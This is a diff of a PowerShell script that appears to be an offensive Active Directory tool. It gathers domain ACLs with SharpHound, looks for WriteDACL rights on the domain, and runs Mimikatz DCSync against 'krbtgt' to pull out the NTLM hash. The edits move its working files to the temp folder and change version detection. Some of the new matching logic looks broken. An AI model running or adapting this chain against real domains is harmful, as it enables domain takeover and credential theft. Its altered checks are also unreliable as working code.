@@ -1,4 +1,4 @@
-### Written by Rindert Kramer
+<#### Written by Rindert Kramer
 
 ####################
 #
@@ -28,6 +28,10 @@
 # thx: https://social.technet.microsoft.com/Forums/ie/en-US/f238d2b0-a1d7-48e8-8a60-542e7ccfa2e8/recursive-retrieval-of-all-ad-group-memberships-of-a-user?forum=ITCG
 # thx: https://raw.githubusercontent.com/canix1/ADACLScanner/master/ADACLScan.ps1
 # thx: https://blogs.msdn.microsoft.com/dsadsi/2013/07/09/setting-active-directory-object-permissions-using-powershell-and-system-directoryservices/
+#>
+
+
+
 
 [CmdletBinding()]
 [Alias()]
@@ -47,6 +51,7 @@ Param
     [string]$userAccountToPwn = 'krbtgt',
     [switch]$logToFile   
 )
+
 
 #region ADFunctions
 
@@ -634,9 +639,8 @@ function Invoke-Cleanup {
     # Removes files that were created
     Write-Status 'Removing files...'
     $global:filesCreated | Sort-Object -unique | ForEach-Object {
-        Remove-Item -Path $_ -Force
-    }
-
+        Remove-Item -Path $_ -Force -ErrorAction SilentlyContinue
+        } -ErrorAction SilentlyContinue
     # Remove ACE's
     if (-not $global:NoSecCleanup){
         Write-Status "Removing ACEs..."
@@ -1384,23 +1388,18 @@ function Import-CSVACL ($csvLocation) {
     return $r
 }
 
+
 function Is-NewSharphoundVersion([string]$sharphoundLocation){
 
     $result = $false
+    Write-Status "Checking Sharphound version..." 
+    $sharphoundVersion = [System.Diagnostics.FileVersionInfo]::GetVersionInfo("$sharphoundLocation").FileVersion
 
-    # Dirty hack to get sharphound version :(
-    $tmpPath = [system.IO.Path]::GetTempPath()
-    Start-process -wait -WindowStyle Hidden -filePath $sharphoundLocation -ArgumentList "-h" -RedirectStandardError "$tmpPath\out2.txt"
-
-    $sharpHoundHelp = Get-Content "$tmpPath\out2.txt"    
-    $sharphoundVersion = ($sharpHoundHelp -split '`r`n')[0]
-    Write-Status "Running $($sharphoundVersion)..." 
-
-    if ($sharphoundVersion.ToLower().Contains("sharphound v2")){
+    Write-Status "SharpHound Version $sharphoundVersion..."
+    if ($sharphoundVersion.Contains(3)){
         $result = $true
     }
 
-    Remove-Item "$tmpPath\out2.txt"
     return $result
 }
 
@@ -1411,14 +1410,14 @@ function Get-SharpHoundACL ([string]$sharpHoundLocation, $isNewVersion) {
 
     if ($isNewVersion){
         $fileName = "{0}.zip" -f [datetime]::Now.ToFileTime()
-        $arg = "$($global:ldapConnInfo.domain) -c acl --ZipFileName $($fileName) --NoSaveCache"
+        $arg = "$($global:ldapConnInfo.domain) -c acl --ZipFileName $($fileName) --NoSaveCache --OutputDirectory $($env:tmp)"
     } else {
         $fileName = "{0}" -f [datetime]::Now.ToFileTime()
-        $arg = "-d $($global:ldapConnInfo.domain) -c acl --CSVPrefix $($fileName) --NoSaveCache"
+        $arg = "-d $($global:ldapConnInfo.domain) -c acl --CSVPrefix $($fileName) --NoSaveCache --OutputDirectory $($env:tmp)"
     }
 
     Invoke-Cmd -cmd $sharpHoundLocation -argV $arg
-
+    Write-Status "Running SharHound..."
     $stillRuns     = $true
     $maxSleepTime  = 10 # In minutes 
     $sleepElapsed  = 0
@@ -1426,14 +1425,14 @@ function Get-SharpHoundACL ([string]$sharpHoundLocation, $isNewVersion) {
     
     # Sleep a little, check if file exists if we wake up
     Start-Sleep $sleepInterval
-    $file = Get-ChildItem -Filter "$fileName*"
+    $file = Get-ChildItem "$env:tmp\*$fileName"
     if ($file -ne $null) {
         return $file[0].FullName
     }
 
     do {
         # check if sharphound is still running
-        $p = Get-Process '*SharpHound.exe'
+        $p = Get-Process '*SharpHound'
         if ($p -eq $null) {
             $stillRuns = $false
         } else {
@@ -1454,7 +1453,7 @@ function Get-SharpHoundACL ([string]$sharpHoundLocation, $isNewVersion) {
     }while ($stillRuns)
     
     # Check for file with given prefix
-    $file = Get-ChildItem -Filter "$fileName*"
+    $file = Get-ChildItem "$env:tmp\*$fileName"
     if ($file -eq $null) {
         Write-Error '[Get-SharpHoundACL] No ACL input available.'
         return $null
@@ -1463,20 +1462,20 @@ function Get-SharpHoundACL ([string]$sharpHoundLocation, $isNewVersion) {
     return $file[0].FullName
 }
 
+
 function Import-JsonACL ([string]$sharpHoundZipFileLocation){
 
     # unzip file
-    $fInfo = New-Object System.IO.FileInfo $sharpHoundZipFileLocation
-    $parentFolder = $fInfo.Directory.FullName
-    Unzip-Archive -ziparchive $sharpHoundZipFileLocation -extractpath $parentFolder    
-    $sharpHoundOutputFiles = Get-Childitem -Path $parentFolder -Filter "*.json"
+
+    Unzip-Archive -ziparchive $sharpHoundZipFileLocation -extractpath $env:tmp    
+    $sharpHoundOutputFiles = Get-Childitem -Path $env:tmp -Filter "*.json"
 
     # Keep track of file that were created. We want to remove these files later
     $global:filesCreated += $sharpHoundZipFileLocation
     $sharpHoundOutputFiles.FullName | ForEach-Object {
         $global:filesCreated += $_
     }
-    
+  
     $result = @()
     foreach ($jsonFile in $sharpHoundOutputFiles){
 
@@ -1616,16 +1615,16 @@ function Invoke-DCSync ($mimiKatzLocation, $accountToPwn) {
     $output_fName = "$([System.DateTime]::Now.ToFileTime())_mimiOutput.txt"
     $output_batchFile = "$([System.DateTime]::Now.ToFileTime())_mimi.bat"
 
-    $global:filesCreated += $output_fName
+    $global:filesCreated += "$env:tmp\$output_fName"
     $global:filesCreated += $output_batchFile
-    "`"$($mimiKatzLocation)`" $argV > $output_fName" | Out-File $output_batchFile -Encoding ascii
+    "`"$($mimiKatzLocation)`" $argV > $env:tmp\$output_fName" | Out-File $output_batchFile -Encoding ascii
 
     Invoke-Cmd -cmd 'C:\Windows\System32\cmd.exe' -argV " /c $output_batchFile"
 
     # the invoke-runas runs async, wait for the file to be created.
     $fileBeingCreated = $true
     do {
-        if (-not (Test-Path -Path $output_fName)) {
+        if (-not (Test-Path -Path $env:tmp\$output_fName)) {
             Start-Sleep(1)                
         } else {
             $fileBeingCreated = $false
@@ -1633,16 +1632,16 @@ function Invoke-DCSync ($mimiKatzLocation, $accountToPwn) {
         
     }while ($fileBeingCreated)
 
-    $result = Get-content $output_fName
+    $result = Get-content "$env:tmp\$output_fName"
     $rHash = $result | Where-Object {$_ -match 'Hash NTLM\:\s(?<ntlm_hash>.+)'}
-
-    if ([string]::IsNullOrEmpty($rHash)) {
+    
+    if ([string]::IsNullOrEmpty($rhash)) {
         
         Write-Bad 'Did not find NTLM hash due to following error:'
         Write-Bad ($result | Where-Object {$_.Startswith('ERROR')})
         return
     }
-
+    
     $ntlmHASH = $rHash.Split(' ')[-1]
     return $ntlmHASH
 }
@@ -1722,6 +1721,7 @@ Write-Status "Found $($global:ADInfo.extendedRights.Count) extended rights"
 # Run Sharphound to collect ACL of the target domain
 $isnewSharpHoundVersion = Is-NewSharphoundVersion -sharphoundLocation $SharpHoundLocation
 $aclInputPath = Get-SharpHoundACL -sharpHoundLocation $sharpHoundLocation  -isNewVersion $isnewSharpHoundVersion
+
 $global:filesCreated += $aclPath
 
 if ($aclInputPath -eq $null) {
@@ -1734,6 +1734,7 @@ if ($isnewSharpHoundVersion){
 } else{
     $ACL = Import-CSVACL -csvLocation $aclInputPath
 }
+
 Write-Status "Found $($ACL.Count) ACLs"
 
 # Iterate writeDACL and fullcontrol permissions on the domain object
@@ -1750,8 +1751,15 @@ $writeDACLDomain += $domainACL | Where-Object {$_.ActiveDirectoryRights -eq 'Gen
 $currWriteDaclPerm = @()
 
 # Check if we have writeDACL permissions
-foreach ($g in $groupMembership){
-    $currWriteDaclPerm += $writeDACLDomain | Where-Object {$_.PrincipalName.ToString().ToLower() -like "$($g.NTAccount.ToLower())*"}
+
+if ($domainACL | Where-Object {$_.PrincipalName -ne $null}) {
+    foreach ($g in $groupMembership){
+        $currWriteDaclPerm += $writeDACLDomain | Where-Object {$_.PrincipalName.ToString().ToLower() -eq "$($g.NTAccount.ToLower())*"}
+    }
+} else {
+    foreach ($g in $groupMembership){
+    $currWriteDaclPerm += $writeDACLDomain | Where-Object {$_.AccessControlType.ToString().ToLower() -eq "accessallowed"} 
+    }
 }
 
 if ($currWriteDaclPerm.Count -ge 1) {
